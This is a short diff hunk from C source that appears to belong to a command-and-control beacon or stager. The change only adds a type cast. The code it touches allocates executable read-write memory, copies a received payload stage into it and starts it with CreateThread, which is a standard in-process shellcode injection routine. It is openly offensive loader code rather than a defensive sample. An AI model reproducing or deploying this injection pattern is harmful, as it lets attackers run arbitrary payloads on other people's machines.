@@ -36,7 +36,7 @@ DWORD write_frame(HANDLE my_handle, char * buffer, DWORD length) {
 HANDLE start_beacon(char * payload, unsigned int pylen){
 	DWORD length = (DWORD) pylen;
     /* inject the payload stage into the current process */
-    char * payloadE = VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    char * payloadE = (char *)VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     memcpy(payloadE, payload, length);
     printf("Injecting Code, %d bytes\n", length); 
     CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) payloadE, (LPVOID) NULL, 0, NULL);
